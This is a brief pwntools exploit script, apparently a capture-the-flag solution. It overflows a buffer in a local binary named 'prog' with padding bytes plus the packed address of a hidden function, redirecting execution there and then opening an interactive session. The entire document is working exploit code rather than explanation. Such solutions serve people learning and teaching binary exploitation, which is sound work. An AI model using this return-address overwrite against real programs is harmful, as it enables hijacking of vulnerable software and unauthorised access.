from pwn import *

context.binary = 'prog'
e = context.binary
addr = e.sym.it_is_never_used__or_is_it

p = e.process()

payload = b'A'*(1+context.bytes)
payload += pack(addr)

p.sendline(payload)
p.interactive()
